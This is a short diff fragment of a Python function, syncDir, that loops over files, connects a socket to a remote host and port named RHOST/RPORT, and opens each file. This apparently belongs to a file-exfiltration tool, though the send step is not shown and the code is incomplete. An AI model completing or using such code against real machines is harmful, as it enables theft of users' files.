@@ -39,7 +39,8 @@ def syncDir():
         if os.path.isfile(file) is False:
             continue
         sock0.connect((RHOST, RPORT))
-        with open(file)
+        with open(file, 'r') as target:
+            
 
 
 def printIcon():
